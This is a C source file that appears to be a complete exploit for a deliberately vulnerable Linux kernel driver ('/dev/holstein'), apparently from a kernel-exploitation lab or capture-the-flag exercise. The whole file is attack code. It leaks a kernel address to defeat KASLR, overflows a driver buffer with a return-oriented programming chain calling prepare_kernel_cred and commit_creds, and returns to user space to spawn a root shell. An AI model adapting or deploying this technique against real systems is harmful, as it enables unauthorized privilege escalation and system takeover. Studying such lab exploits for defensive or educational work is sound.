#include<stdio.h>
#include<fcntl.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>

#define device "/dev/holstein"
#define asm __asm__
#define LOG_INFO(msg) ({ \
    printf("[*] "); \
    puts(msg); \
})

#define LOG_SUCCESS(msg) ({ \
    printf("[+] "); \
    puts(msg); \
})


#define fatal(msg)({ \
    perror(msg); \
    exit(1); \
})

int fd;
unsigned long user_ss, user_rsp, user_rflags, user_cs, user_rip;

void open_dev() 
{
    fd = open(device, O_RDWR);
    if(fd < 0) {
        fatal("[*] Cannot open device!");
    } else {
        LOG_SUCCESS("Open device!");
    }
}
static void win() 
{
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
    LOG_SUCCESS("win!");
}
static void save_state()
{
    asm(
        ".intel_syntax noprefix;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "mov user_cs, cs;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    LOG_INFO("save state!");
}

static void shellcode() 
{
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "mov rax, 0xffffffff8106e240;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, 0xffffffff8106e390;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_rsp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax"
    );
}

#define NO_ASLR 0xffffffff81000000;
#define pop_rdi 0xffffffff8127bbdc - NO_ASLR;
#define pop_rax  0xffffffff81022741 - NO_ASLR;
#define pop_rcx  0xffffffff812ea083 - NO_ASLR;
#define call_rax 0xffffffff81018607 - NO_ASLR;
#define jmp_rax 0xffffffff81000087 - NO_ASLR;
#define swapgs 0xffffffff8160bf7e - NO_ASLR;
#define iretq 0xffffffff810202af - NO_ASLR;
#define push_rdi 0xffffffff8104cb8a - NO_ASLR;
#define push_rax 0xffffffff81021cf9 - NO_ASLR;
#define mov_rdi_rax_rep 0xffffffff8160c96b - NO_ASLR;
#define escalte 0xffffffff8106e240 - NO_ASLR;
#define prepare_kernel_cred 0xffffffff8106e240 - NO_ASLR
#define commit_cred 0xffffffff8106e390 - NO_ASLR

unsigned long kbase = 0;

void dev_read() {
    unsigned long offset = 0x13d33c;
    unsigned char data[0x410] = {0};
    ssize_t size = read(fd, data, 0x410);
    if(size < 0) {
        fatal("Read Failed!");
    }
    kbase = *(unsigned long*)&data[0x408] - offset;
    printf("[*] kbase: 0x%lx\n", kbase);
}

int main() { 
    open_dev();
    dev_read();

    unsigned char payload[0x420] = { 0 };
    unsigned long *rop_chain;
    size_t offset = 0;
    ssize_t len;
    save_state();
    user_rip = (unsigned long) win;
    memset(payload, 'A', 0x408);
    rop_chain = (unsigned long*)&payload[0x408];
    unsigned long todo[5] = { user_rip, user_cs, user_rflags, user_rsp, user_ss};
    // writing rop_chain:
    rop_chain[offset++] = kbase + pop_rdi;
    rop_chain[offset++] = 0; 
    rop_chain[offset++] = kbase + pop_rax; 
    rop_chain[offset++] = kbase + prepare_kernel_cred ; // prepare_kerel_cred
    rop_chain[offset++] = kbase + jmp_rax;
    rop_chain[offset++] = kbase + pop_rcx;
    rop_chain[offset++] = 0;
    rop_chain[offset++] = kbase + mov_rdi_rax_rep;
    rop_chain[offset++] = kbase + pop_rax;
    rop_chain[offset++] = kbase + commit_cred; // commit_cred
    rop_chain[offset++] = kbase + jmp_rax;
    rop_chain[offset++] = kbase + swapgs;
    rop_chain[offset++] = kbase + iretq;
        
    for(int i=0; i<5; i++){
        rop_chain[offset++] = todo[i];
    }
    len = write(fd, payload, 0x408+(offset)*8);
    if (len < 0) {
        fatal("[-] Cannot write to device!");
    } else {
        LOG_INFO("Write to device!");
    }
    close(fd);
    return 0;
}